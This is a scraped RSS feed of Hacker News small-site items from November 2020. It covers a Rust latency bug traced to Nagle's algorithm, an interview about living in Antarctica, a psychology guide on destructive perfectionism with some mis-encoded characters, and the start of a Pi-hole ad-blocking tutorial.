<p>Start building a better, warehouse-first CDP that delivers complete, unified data to every part of your marketing and analytics stack. Sign up for <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a> today.<br>Join our <a href="https://resources.rudderstack.com/join-rudderstack-slack">Slack</a> to chat with our team, check out our open source repos on <a href="https://github.com/rudderlabs">GitHub</a>, and follow us on social: <a href="https://twitter.com/RudderStack">Twitter</a>, <a href="https://www.linkedin.com/company/rudderlabs/">LinkedIn</a>, <a href="https://dev.to/rudderstack">dev.to</a>, <a href="https://rudderstack.medium.com/">Medium</a>, <a href="https://www.youtube.com/channel/UCgV-B77bV_-LOmKYHw8jvBw">YouTube</a>.</p>
                    </div>
                </section>
            </article><div>
                <div>
                                        <p><img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/Gavin-Headshot-20200907-08-Square.png">
                    </p>
                    <p><span>Gavin</span>
                                                                            <span>Johnson</span>
                                                                    </p>
                    
                </div>
                <p>
                                            Product Marketer at RudderStack. 
Ex-PMM at New Relic &amp; AT&amp;T. Ex-consultant at Deloitte. Ex-sys admin. (Sometimes) Ex-developer.                                    </p>
            </div></div>]]>
            </description>
            <link>https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069882</guid>
            <pubDate>Thu, 12 Nov 2020 14:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What You Can Learn from Living in Antarctica]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069843">thread link</a>) | @CapitalistCartr
<br/>
November 12, 2020 | http://m.nautil.us/issue/92/frontiers/what-you-can-learn-from-living-in-antarctica | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/92/frontiers/what-you-can-learn-from-living-in-antarctica">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>J</span><a title="Bold" tabindex="-1" target="_blank"></a>oe Pettit is a person of contradictions. A lover of solitude who manages teams, an engineer who writes poetry and paints, a family man who spends several months a year on remote Antarctic glaciers, installing delicate scientific instruments. It’s a rare mixture of qualities to find anywhere in the world—except, perhaps, in Antarctica.</p><p>Indeed, these days Pettit’s job involves finding other engineers like him, assembling the crack teams that place ice-penetrating radar and other equipment at both poles of the Earth. It’s challenging work, but vital.</p><p>Pettit’s teams provide support and equipment to researchers studying polar glaciers. Glaciers are constantly in motion, flowing outward under the pressure of accumulated snow that compresses into glacial ice. Some glaciers flow as fast as several kilometers a year. They are also melting. As our climate warms, the planet’s ice sheets are vanishing faster than anyone expected, pouring meltwater into rising seas. Understanding glaciers is critical to predicting some of the most severe climate disturbances we face. Researchers need to know how fast glaciers move over different kinds of terrain, where and how they are becoming unstable, and how quickly they may collapse. Pettit makes that possible.</p><figure data-alt="Grunes_BREAKER-1"><img src="http://static.nautil.us/17914_8aef1343f7c60c2dee067172f139bfe0.png" width="733" alt=""><figcaption><span><strong>JACK OF ANTARCTIC TRADES:</strong> Joe Pettit found different jobs to make sure he had work each winter: engineer, research associate, head of glacier search and rescue.</span><span>Courtesy of Joe Pettit</span></figcaption></figure><p>For the past 30 years, Pettit has worked as an engineer and project manager. He first worked the busy summer season at McMurdo Station, the largest research base in Antarctica. Soon he began to work through the winter: eight months of nearly perpetual darkness, brutal cold, and fierce storms. He lived for months without sun, and fell in love with the polar night. He became McMurdo’s resident aurora chaser, reading up on the Southern Lights and alerting his colleagues when they could expect the most dazzling displays. He found different jobs to make sure he had work each winter: engineer, research associate, head of glacier search and rescue.<br></p><p>What does it take to survive—and love—a place like Antarctica? As many of us around the world prepare for our own long, socially distanced winters, Pettit has some wisdom to share. He offers it below in his own words.</p><p><b>Feel at home</b></p><p>I first went down to Antarctica in 1990. It came out of a job search. I was living in Colorado Springs and looking through want ads in the newspaper. I happened upon one for a company called Antarctic Support Associates. They were looking for an engineer and my background is in electrical engineering. The day I got there just happened to be my 30th birthday. It was a white-out. Super windy. As we came off the plane, people would grab our hand and put it on the shoulder of the person in front of us and say, “Just hang onto this guy and follow them over to the vehicle.” I thought “Yeah, this is it!” The next day the clouds lifted, and there’s the Royal Society Mountain Range, stretching about 60 miles out. It was stunning. I couldn’t believe it. I went down there not knowing what it was going to be like, because it didn’t fit in the framework of any of my previous experiences. I loved that part of it, I loved where I was, I loved the science and the work I was doing.</p><blockquote><p>If you expect it to be amazing and filled with new experiences, you end up looking for those experiences.</p> </blockquote><p><b>Follow the stars</b><br></p><p>To spend an entire year is the only way to experience Antarctica. It changes every day—the light, the people, their moods, the pace of life. From the summer to the winter, things slow down. It’s amazing to use the stars spinning overhead during the winter as a sundial, where by the position of stars you know what time of day or night it is. It’s been 30 years for me now, which is hard to imagine. But every year there will be something that happens, or something I see, and I’ll be like, “Yeah, this is why I keep coming back, this is where the magic is.” For me it’s just the majestic nature of the place, the fact it’s so remote, so austere, and yet so incredibly beautiful. The sense of the scale of Antarctica is what really touches me.</p><p><b>Have no expectations</b></p><p>You have to know what your expectations are. If you expect it to be hard, it’s going to be hard. If you expect it to be amazing and filled with new and interesting experiences, you end up looking for those experiences. People who are resourceful and come up with ways of managing changing conditions personally or professionally do better over the long haul. One thing that happens to the best of us is putting a departure date on the calendar. Inevitably you don’t make it out that day because the air strip needs to be adjusted or the plane can’t fly because the weather makes it impossible for the pilot to see anything. A lot of people really suffer with that. They lose it. But people who can make plans A, B, C, and D and not be bothered by the fact that the first three plans just went out the window do well. The flexible are the ones who do best in Antarctica.</p><figure data-alt=" Grunes_BREAKER-2"><img src="http://static.nautil.us/17916_5c43b9568403ee749d068633ddb3535c.png" width="733" alt=""><figcaption><span><strong>THE SCALE:</strong> Neumayer Channel is just one feature of Antarctica’s majesty. “The sense of the scale of Antarctica is what really touches me,” says Pettit.</span><span>Beth Simmons</span></figcaption></figure><p><b>Love to be alone</b><br></p><p>People who enjoy people, but at the same time are comfortable being alone, do best. There’s solitude and seclusion, and how you feel about that makes a difference. If you’re an introvert, you can manage well, though a lot of things, like meals, take place in a large-group setting. So if you’re an introvert you may feel awash in a sea of faces. People who are curious do well because everybody’s asking questions about the place and wondering about Antarctica. Being curious about the science, about each other, makes a difference. People comfortable being far away from home will stay there longer than people who aren’t.</p><p>It’s helpful to have hobbies. I fall on the artist side of things, so on my down time I do painting and drawing, photography, and music. People who like to be outdoors and hike or ski do really well. I’ve met people who stay in town or indoors as much as they can, and they tend to get more dour as time goes on. So being able to get out and actually immerse yourself in the experience of the place is really important. I wintered with a woman once who was a hair stylist. She was going to stay in Building 155, where the dining facility is, and most of the administration and recreation departments, her entire winter. She thought, “That’s going to be my challenge.” And I thought, “What a loss!” She never saw an aurora, she never saw some of the beautiful things that happen during the winter. She met her challenge but it was to the detriment of completely missing the experience of Antarctica.</p><blockquote><p>If you’ve got a bunch of pessimists together, then nothing is going to happen other than misery.</p> </blockquote><p><b>Be optimistic</b><br></p><p>If you surround yourself with people who are optimistic, then you’ve got a really good team. If you’ve got a bunch of pessimists together, then nothing is going to happen other than misery. That’s a fact of life anywhere, but when you’re really on the margins, and things can go either way depending on which decision you make, coming at problems optimistically broadens the horizon of possible ideas you can come up with—as opposed to, “Oh, it’s just not going to work.” We work on equipment and instruments as if they’re going to be on the moon. There are no hardware stores. Once an instrument is out there, especially in the deep field, you can’t get back to it for a year or two. So you design and build and test things with the expectation that they have to work. You try to stack the deck in your favor in every way you can possibly imagine.</p><p><b>Appreciate luck</b></p><p>Once, we had a massive storm in June, which is midwinter. It was during an airdrop. Air Force planes would drop pallets full of food and mail out of the back of the plane, with parachutes, onto a designated drop zone. To get ready for the drop, you have to bring power to the zone, which in this case was a snowy runway. A crew would go out there and have runway lights on two sides of the drop zone. This storm was particularly horrendous. The crew driving out there should have stopped, but they kept going and it got worse. They couldn’t see the bamboo poles marking the road, and wandered off into the darkness. We had to go find them. The wind speed was so high it was roaring like a freight train. You had to get up to someone’s ear and yell at them to get any information past that roar. Suddenly, the wind went from 100 sustained knots to virtually zero. It just stopped all at once, and there was this fine haze of snow coming down. We called the lost supply van and asked, “You guys have a flashlight?” We told them to get up on top of the van and start spinning around in a circle. Sure enough, somebody spotted a light and we got a compass bearing on them. It was a lucky break. Sometimes you just have to rely on that luck and say, “You know, that’s good enough.”</p><p><i>Marissa Grunes is a postdoctoral fellow at the Harvard University Center for the Environment, where she is at work on a book about Antarctica.</i></p><p><i>Lead image:&nbsp;U.S. research outpost, Palmer Station, located on Anvers Island in Antarctica, where Joe Pettit has been manager of operations. Photo by Marie Zahn.</i></p><div>
<article>
<p><a href="http://m.nautil.us/issue/23/Dominoes/fear-in-the-cockpit" data-trval="fear-in-the-cockpit" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/5799_de01d76e793fec3fba32f4401a45fb20.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>
<div>
<p><span>
<span>

<span><a href="http://m.nautil.us/term/f/Psychology">Also in Psychology</a></span>&nbsp;&nbsp;</span>
</span></p><h4><a href="http://m.nautil.us/issue/23/Dominoes/fear-in-the-cockpit" data-trval="fear-in-the-cockpit" data-trlbl="foc_rec" data-tract="internal_art">Fear in the Cockpit</a></h4>
<p>By Jeff Wise</p>
<p>
The morning of Feb. 4, 2015, was drearily normal in Taipei. With the sky blanketed in low clouds, pushed by a moderate breeze, the day was neither hot nor cold, neither stormy nor fair. For many of the passengers that...<strong><a href="http://m.nautil.us/issue/23/Dominoes/fear-in-the-cockpit" data-trval="fear-in-the-cockpit" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>
</p>

</div>

</article>
</div>
			



						
			

		</div></div>]]>
            </description>
            <link>http://m.nautil.us/issue/92/frontiers/what-you-can-learn-from-living-in-antarctica</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069843</guid>
            <pubDate>Thu, 12 Nov 2020 13:56:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[40ms bug: a missing writev, Nagle's algorithm, and delayed ACKs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069734">thread link</a>) | @fanf2
<br/>
November 12, 2020 | https://vorner.github.io/2020/11/06/40-ms-bug.html | <a href="https://web.archive.org/web/*/https://vorner.github.io/2020/11/06/40-ms-bug.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
      <section id="main_content">
        

<p>This is a small story about tracking down a production bug in a Rust
application. I don’t know if there’s any take away from this one for the reader,
but it felt interesting so I’m sharing it.</p>

<h2 id="a-bit-of-backstory">A bit of backstory</h2>

<p>In Avast, we have a Rust application called <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It serves as a backend to
some other applications, provides them a HTTP API. It’s in Rust because it is
latency critical. Latencies of most requests are under a millisecond.</p>

<p>It was written with <a href="https://docs.rs/tokio/0.1.*"><code>tokio-0.1</code></a> and <a href="https://docs.rs/hyper/0.12.*"><code>hyper-0.12</code></a> to deal with the HTTP. We
were quite late to update to newer versions, in part because it worked fine and
the amount of <code>async</code> code was single quite short function, so we didn’t have
much motivation. And in part because we use the <a href="https://crates.io/crates/spirit"><code>spirit</code></a> libraries for
configuration. It’s a library to take configuration and set up the internal
state of the program for it ‒ configuration contains the ports to listen to,
etc, and it manages spawning the HTTP server objects inside the program and can
even migrate from one set of ports to other at runtime.</p>

<p>But migrating <a href="https://crates.io/crates/spirit"><code>spirit</code></a> to newer <code>tokio</code> and <code>hyper</code> was a big task (because
the API surface is quite large, the library does a bit unusual things compared
to all the usual applications and the change between old and new <code>tokio</code> was
quite large).</p>

<p>Anyway, eventually I got permission to work on the migration of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> as
part of my job. It took about a week to migrate both <a href="https://crates.io/crates/spirit"><code>spirit</code></a> and <a href="https://vorner.github.io/2019/05/19/rust-in-avast.html">urlite</a>. It
went through review, went through the automatic tests and we put it to the
staging environment for a while, watching the logs and graphs. Everything seemed
fine, so after few days of everything looking fine, we pushed the button and put
it to production.</p>

<h2 id="the-increased-latencies">The increased latencies</h2>

<p>As it goes in these kinds of stories, by now you’re expecting to see what went
wrong.</p>

<p>The thing is, our own metrics and graphs were fine. But the latency on the
downstream service querying us increased by 40ms. The deployment got reverted,
and we started to dig into where these latencies come from.</p>

<h2 id="it-was-acting-really-weird">It was acting really weird</h2>

<p>There were several very suspicious things about that.</p>

<ul>
  <li>Our own „internal“ latencies stayed the same. Our CPU usage also stayed the
same.</li>
  <li>The latency graph on the downstream side was flat 40ms <em>constant</em>.</li>
</ul>

<p>Now, if we introduced some performance regression in the query handling, we
would expect our CPU consumption to rise. We would also expect the latency graph
to be a bit spiky, not completely flat 40ms constant. It almost looked like
there was a 40ms <code>sleep</code> somewhere. But why would anyone put a 40ms sleep
anywhere?</p>

<p>I’ve looked through documentation and didn’t see anything obvious. I’ve tried
searching both our code and code of the dependencies for <code>40</code>, asked on Slack if
that <code>40ms</code> value was familiar to anyone. Nothing.</p>

<p>The working theory we started with was that there could be some kind of back-off
sleep on some kind of failure. Maybe <code>hyper</code> would be closing inactive
connections in the new version, forcing the application to reconnect (the graph
was for 99th percentile, so if we happened to close each 100th connection and
reconnection took this long…) and maybe try IPv6 first and we would be listening
on IPv4 only or… (in other words, we didn’t have a clear clue).</p>

<h2 id="the-benchmarks">The benchmarks</h2>

<p>My colleague started to investigate in a more thorough way than just throwing
ideas around on Slack. He run a <code>wrk</code> benchmark against the service. On his
machine, the latencies were fine. So he commandeered one of the stage nodes to
play with it and run the benchmark there. And every request had 40ms latency on
that machine. The previous version of <code>urlite</code> was fine, with under one
millisecond.</p>

<p><em>Something</em> was probably sleeping somewhere on the production servers, but not
on the development machine. There probably was some difference in the OS
settings, but definitely difference in the kernel version. The servers are
running some well-tried Linux distribution, so they have a lot older version,
while a developer is likely to run something much more on the edge.</p>

<h2 id="configuration-options">Configuration options</h2>

<p>The selling point of <a href="https://crates.io/crates/spirit"><code>spirit</code></a> is that most of the thing one can set in the
builders of various libraries and types now can be just put into a config file
without any recompilation. If we did configuration by hand, we would expose only
the things we thought would be useful, but with spirit, there’s everything. So,
naturally, tweaking some of the config knobs was the next step (because it was
easy to do).</p>

<p>It was discovered that turning the <code>http1-writev</code> option <em>off</em>, which
corresponds to
<a href="https://docs.rs/hyper/0.13.8/hyper/server/struct.Builder.html#method.http1_writev">this method</a>
in <code>hyper</code>, made the latencies go away.</p>

<p>We now had a solution, but I wasn’t happy about not understanding <em>why</em> that
helped, so I went to dig the rabbit hole and find the root cause. Turns out
there were several little things in just the constellation to make the problem
manifest.</p>

<h2 id="overriding-the-defaults-of-http1_writev">Overriding the defaults of <code>http1_writev</code></h2>

<p>The method controls the strategy in which way data are pushed into the socket.
With vectored writes enabled, it sends two separate buffers (one with headers,
the other with the body if it’s small enough) through a single <a href="https://linux.die.net/man/2/writev"><code>writev</code></a>
syscall.  If they are disabled, <code>hyper</code> copies all the bytes into a single
buffer and sends that as a whole.</p>

<p>It turns out that the method takes a <code>bool</code>, but there are actually 3 states.
The third (auto) is signalled by <em>not</em> calling the method and <code>spirit-hyper</code> was
calling it always, with the default to turn the <a href="https://linux.die.net/man/2/writev"><code>writev</code></a> on. I don’t know if
leaving it on auto would make the bug go away, but I’ve fixed the problem in the
library anyway.</p>

<h2 id="splitting-vectored-writes">Splitting vectored writes</h2>

<p>Spirit wants to support a bit of configuration on top of what the underlying
libraries provide on their own. One of such things is limiting the number of
concurrently accepted connections on a single listening socket. Users don’t have
to take advantage of that (the types for the configuration can be composed
together to either contain that bit or not and the administrator may leave the
values for the limits unset in the configuration and then they won’t be
enforced).</p>

<p>Anyway, in case the support for the limits is opted in through using the type
with the configuration fields, the connections themselves are wrapped in a
<a href="https://docs.rs/spirit-tokio/0.7.*/spirit_tokio/net/limits/struct.Tracked.html"><code>Tracked</code></a>
type. The type tries to be mostly transparent for use and can be used inside
<code>hyper</code> (which is what the default configuration type alias in <code>spirit-hyper</code>
does), but tracks how many connections there are, to not accept more if it runs
out of the limit.</p>

<p>When implementing the bunch of traits for the wrapper, I’ve overlooked the
<a href="https://docs.rs/tokio/0.2.*/tokio/io/trait.AsyncWrite.html#method.poll_write_buf"><code>AsyncWrite::poll_write_buff</code></a>.
It is a provided method, which means it has a default implementation. It is the
one that abstracts the OS-level <code>writev</code>, it can write multiple buffers (the
<a href="https://docs.rs/bytes/0.5.*/bytes/buf/trait.Buf.html"><code>Buf</code></a> represents a
segmented buffer).</p>

<p>The default implementation simply delegates to multiple calls to the ordinary
write. Therefore, this omission combined with the default of enabling vectored
writes results in calling into the kernel twice, each time with a small buffer,
instead of once with two small buffers or once with a big buffer.</p>

<p>That was definitely something to get fixed, because if nothing else, syscalls
are expensive and calling more of them is not great. But I’ve finally felt like
I’m on the right path, because:</p>

<h2 id="nagles-algorithm">Nagle’s algorithm</h2>

<p>You probably know that TCP stream is built from packets going there and back.
Optimizing how to split the stream into the packets and when to send them is a
hard problem and the research in that area is still ongoing, because there are
many conflicting requirements. One wants to deliver the data with low latency,
utilize the whole bandwidth, but not overflow the capacity of the link (in which
case the latencies would go up or packets would get lost and would have to be
retransmitted), leave some bandwidth to other connections, etc.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Nagle%27s_algorithm">Nagle’s algorithm</a> is
one of the older tricks up in TCP’s sleeve. The network doesn’t like small
packets.  It is better to send as large packets as the link allows, because each
packet has certain overhead ‒ the headers that take some space, but also routers
spend computation power mostly based on number of packets and less on their
size. If you start sending a lot of tiny packets, the performance will suffer.
While the links are limited by the number of bytes that can pass through them,
routers are more limited by the number of packets. If a router declares to be
able to handle a gigabit connection, it actually means a gigabit <em>if you use
full-sized packets</em>, but will get to few megabits if you split the data into
tiny packets.</p>

<p>So it would be better to wait until the send buffer contains a packetfull of
data before sending anything. But we can’t do that, because we don’t <em>know</em>
there’ll ever be a full packet of data, or generating more data might wait for
the other side to answer. We would never send anything and wait forever and the
Internet would not work.</p>

<p>Instead, the algorithm is willing to send <em>one</em> undersized packet and then it
waits for an <code>ACK</code> from the other side until sending another undersized one. If
it gets a packetfull of data to send in the meantime, that’s great and it sends
it (it won’t get better by waiting longer), but it won’t ever have two
undersized ones somewhere in flight, therefore won’t kill the network’s
performance by them.</p>

<p>This works, it’ll make progress eventually because once the <code>ACK</code> comes and
all the data that accumulated until then is sent.</p>

<p>But it also slows things down. Like in our case. What happens if we do it using
single syscall, the whole HTTP response forms a single undersized packet (we
have really small answers) and gets sent, no matter if it’s submitted to the
kernel by one big or two small buffers.</p>

<p>On the other hand, if we split the submission into two syscalls, this is what
happens:</p>

<ul>
  <li>We write the first part (headers). The kernel sends them out as an undersized
packet.</li>
  <li>We write the second part (the body). But the kernel shelves them into the send
buffer and waits for sending them until it sees the <code>ACK</code>, because there’s one
undersized packet …</li></ul></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vorner.github.io/2020/11/06/40-ms-bug.html">https://vorner.github.io/2020/11/06/40-ms-bug.html</a></em></p>]]>
            </description>
            <link>https://vorner.github.io/2020/11/06/40-ms-bug.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069734</guid>
            <pubDate>Thu, 12 Nov 2020 13:43:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to get over ‘never good enough’]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25069727">thread link</a>) | @CapitalistCartr
<br/>
November 12, 2020 | https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide | <a href="https://web.archive.org/web/*/https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><h2 data-guide-section-number="1"><span>Need to know</span></h2><div><p>â€˜If itâ€™s worth doing, itâ€™s worth doing well.â€™ How many times did I hear that growing up? My parents were attempting to teach me (just in case I hadnâ€™t absorbed it from their actions) the importance of striving for excellence. They were encouraging what some psychologists call â€˜constructive perfectionismâ€™ or â€˜healthy perfectionismâ€™ â€“ a personality trait thatâ€™s associated with finding enjoyment and even fulfilment in life from doing things as well as you possibly can. With constructive or â€˜positive perfectionismâ€™, the focus is process-oriented; you learn from mistakes or even failure. Itâ€™s generally considered a beneficial trait thatâ€™s linked with being more conscientious and self-disciplined.</p>
<p>Yet perfectionism can have a darker side. The American academic and author BrenÃ© Brown defined this kind of perfectionism in her first <a href="https://www.hazelden.org/HAZ_MEDIA/2545_GiftsofImperfection.pdf" rel="nofollow noreferrer noopener">book</a>, <em>The Gifts of Imperfection</em> (2010), as â€˜a self-destructive and addictive belief system that fuels this primary thought: if I look perfect, live perfectly, and do everything perfectly, I can avoid or minimise the painful feelings of shame, judgment and blame.â€™ This form of perfectionism, which is fuelled by inner shame that must be quelled, involves trying to constantly meet perceived expectations of what â€˜perfectâ€™ is. This perfectionism isnâ€™t fulfilling and itâ€™s far from enjoyable. Yet many people feel itâ€™s mandatory to look as if all <em>is</em> perfect. They believe that not to do so would imply imperfection.</p>
<p>This is whatâ€™s <a href="https://psycnet.apa.org/record/1996-14509-001" rel="nofollow noreferrer noopener">known</a> in the wider psychological literature as â€˜unhealthy perfectionismâ€™ or â€˜destructive perfectionismâ€™. In this case, the purpose has nothing to do with process. Itâ€™s goal-oriented. Itâ€™s driven. Itâ€™s pressured. And I believe itâ€™s increasingly contributing to mental health problems.</p>
<p>Constructive perfectionists, letâ€™s say if theyâ€™re swimmers, want to beat their personal best. That brings with it all kinds of positive vibes. Winning the race is great, if indeed they do.</p>
<p>But destructive perfectionists want to be the perfect swimmer. And winning <em>every</em> race is the goal; if not, shame says to them that they have little to no value or worth.</p>
<p>Many perfectionistic people will fall somewhere on a spectrum between the two poles. But in my clinical practice Iâ€™ve noticed another issue. Ironically, destructive perfectionists might not even recognise themselves as perfectionists, because they never believe their best is good enough. Thereâ€™s always the next achievement. And then the next. And the next.</p>
<p>So, what are the roots of destructive perfectionism? I believe people often develop this way of thinking and being when they grow up without a sense of support, safety and nurturing. It can also be a reaction to childhood trauma or extreme cultural expectations, where appearing perfect becomes a mandatory strategy to emotionally survive, and where vulnerability is disdained.</p>
<p>Over the past decade, Iâ€™ve treated more and more people who didnâ€™t quite know why theyâ€™d come to therapy. Theyâ€™d erected huge barriers against revealing any kind of emotional pain; I wondered if they even had the capability of expressing such feelings. Outwardly, they didnâ€™t seem depressed at all; the descriptions of their issues sounded more like the result of overwork, fatigue or mild anxiety.</p>
<p>My interpretation is that they were destructive perfectionists who were running out of steam, but not sure what, if anything, was wrong. Their emotional pain was expertly, and often unconsciously, hidden.</p>
<p>If I asked them if they were depressed, Iâ€™d hear a firm denial. â€˜I have too many blessings in my life.â€™ If I questioned whether or not their childhood provided safety and security, theyâ€™d laugh and deny or discount any kind of problem. Or sometimes theyâ€™d become very quiet and look out the window, as if they wished they were anywhere but my office.</p>
<p>Yet as they returned for more sessions, theyâ€™d slowly risk sharing one shame-filled secret after another. Their seemingly impenetrable cloak of silence would slowly slip off, only to reveal tremendous loneliness and despair.</p>
<p>And in many cases, as they let down their guard, I found they could also understand that what was â€˜wrongâ€™ or unhealthy might not fit the rubric of classic depression. But it was just as real. And just as damaging.</p>
<p>I began researching the popular literature about perfectionism, shame and fear of vulnerability. I found a wealth of <a href="https://www.guilford.com/books/Perfectionism/Hewitt-Flett-Mikail/9781462528721/authors" rel="nofollow noreferrer noopener">research</a> and writings about the importance of vulnerability and the cost of shame by the aforementioned Brown, the much earlier thoughts on â€˜covert depressionâ€™ by the author and family therapist Terrence Real, and the <a href="https://www.harpercollins.com/products/self-compassion-kristin-neff?variant=32205936885794" rel="nofollow noreferrer noopener">book</a> <em>Self-Compassion</em> (2015) by the psychologist Kristin Neff. But crucially I couldnâ€™t find anything for the general public about the relationship between perfectionism and a form of potentially serious depression.</p>
<p>So, drawing on the experiences and stories of the many clients Iâ€™ve seen in my practice over 25 years, I formulated my own ideas about this distinct problem and how it can be addressed most effectively and compassionately. My work â€“ laid out in my <a href="https://drmargaretrutherford.com/perfectlyhiddendepressionbook/" rel="nofollow noreferrer noopener">book</a> <em>Perfectly Hidden Depression</em> (2019) â€“ is based on how a dangerous kind of perfectionism-fuelled depression can affect someoneâ€™s life; how even if someone scores low on a standard depression inventory, they can be living with deep-seated emotional difficulties and unresolved traumatic experiences that might ultimately threaten their will to live. This is the syndrome I call â€˜perfectly hidden depressionâ€™.</p>
<p>Iâ€™ve identified 10 traits that manifest in the daily decision-making and behaviour of people who exhibit signs of this syndrome:</p><ul>
<li>You are highly perfectionistic, fuelled by a constant, critical inner voice of intense shame or fear.</li>
<li>You demonstrate a heightened or excessive sense of responsibility and look for solutions.</li>
<li>You have difficulty accepting and expressing painful emotions, remaining more analytical or â€˜in your headâ€™.</li>
<li>You discount, dismiss or deny abuse or trauma from the past, or the present.</li>
<li>You worry a great deal (but hide that habit) and avoid situations where youâ€™re not in control.</li>
<li>You are highly focused on tasks and othersâ€™ expectations, using accomplishment as a way to feel validated. Yet as the last accomplishment fades, new pressure assumes itself, and any success is discounted.</li>
<li>You have an active and sincere concern for the wellbeing of others, while allowing few (if any) into your inner world.</li>
<li>You hold a strong belief in â€˜counting your blessingsâ€™ and feel that any other stance reflects a lack of gratitude.</li>
<li>You have emotional difficulty with personal intimacy but demonstrate significant professional success.</li>
<li>You might have accompanying mental health issues that involve anxiety and control issues, such as obsessive-compulsive disorder (OCD), generalised anxiety disorder (GAD), panic and/or eating disorders.</li>
</ul><p>If you read these 10 traits and find that many or all of them match you, then hopefully this is in some sense reassuring â€“ it might give you an inkling of why you feel the way you do, how you havenâ€™t known what was wrong and have been ashamed to even consider it. If suddenly a light has come on â€“ you recognise that you canâ€™t bring yourself to share any vulnerability; or perhaps you recognise these traits in someone else, then first â€“ breathe. And know this: Iâ€™ve found there is an antidote to perfectly hidden depression â€“ self-acceptance.</p></div></div></section><section><div><h2 data-guide-section-number="2"><span>What to do</span></h2><div><p>If you believe that you are an unhealthy perfectionist and that it could be masking your own deep-rooted emotional problems, I propose five stages that can help you: consciousness, commitment, confrontation, connection and change.</p>
<p><strong>The first stage: consciousness</strong></p>
<p>This stage refers to the importance of becoming aware that your perfectionism is a problem in the first place. Although recognising oneâ€™s problems is a part of every emotional/mental healing process, this stage might be especially complicated for you because youâ€™ve convinced yourself that your perfectionist traits are normal or not a problem. â€˜Isnâ€™t everyone like this?â€™ you might wonder. The answer to that is a resounding â€˜noâ€™. Yet giving up or tweaking a strategy thatâ€™s brought you external success is likely to be very difficult. In fact, the process of avoiding any painful feelings and memories might have become something you do unconsciously.</p>
<p>There are various ways to develop more insight into the role that destructive perfectionism is playing in your life, but one exercise that you can try on your own is mindfulness. Mindfulness authors teach that itâ€™s not a process where you have to ensure youâ€™re always focusing intently on something. Mindfulness is more about changing <em>how</em> youâ€™re paying attention. Mindfulness deepens your experience of the present.</p>
<p>Hereâ€™s one simple mindfulness technique: sit somewhere comfortable and set a timer for three to five minutes. Breathe deeply and close your eyes. Stay as focused on your breaths as possible, even counting them from one to 10, and then starting over. If your mind wanders (which it will), gently let go of those thoughts and refocus on the breath. When the timer goes off, check in with your emotions, your eyes still closed. There could be irritation, relief, feeling silly. Simply notice and watch them dissipate.</p>
<p>Becoming conscious takes patience. The more you practise mindfulness, youâ€™ll begin to notice more about <em>how</em> youâ€™re interacting with both your external and internal worlds, including developing greater insight into how needing to seem perfect has seeped into almost all aspects of your life.</p>
<p><strong>The second stage: commitment</strong></p>
<p>As you become more aware of the problems perfectionism is causing you, you might still find that changing is hard. Ironically (and destructively) this can morph into another goal for you to reach perfectly. Iâ€™ve found that there are five major stumbling blocks to challenging perfectionismâ€™s grasp on your …</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide">https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-get-over-never-good-enough-a-practical-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069727</guid>
            <pubDate>Thu, 12 Nov 2020 13:42:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remove ads from your life using Raspberry Pi, Docker and Docker Compose]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25069717">thread link</a>) | @karakanb
<br/>
November 12, 2020 | https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/ | <a href="https://web.archive.org/web/*/https://burakkarakan.com/blog/pihole-on-raspberry-using-pi-docker-and-docker-compose/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<header>
<time datetime="2020-10-12T00:00:00+00:00">October 12, 2020</time>
</header>
<p>I need to start this article with some simple disclaimers: I love Raspberry Pi, I love Docker, I don’t love networking that much (spoiler alert: I suck at it).</p>
<ul>
<li>I love Raspberry Pi because it is a tiny, fully functioning computer that gives me goosebumps. It is one of those things that makes you feel like <a href="https://en.wikipedia.org/wiki/Mr._Robot">Mr. Robot</a>. It is relatively cheap, it is accessible, and there are tons of guides online to do pretty much anything you can imagine.</li>
<li>I love Docker because it is a simple way of running various pieces of software in a standardized way: you pull the Docker image for your platform, you run the image with a single command and that’s it! You can glue things together, you can add your own images, you can share your configuration, you can run the same setup on different machines, and you can destroy things easily once you don’t need them anymore. I am not saying it is the simplest software ever, but it is relatively easy to play around with.</li>
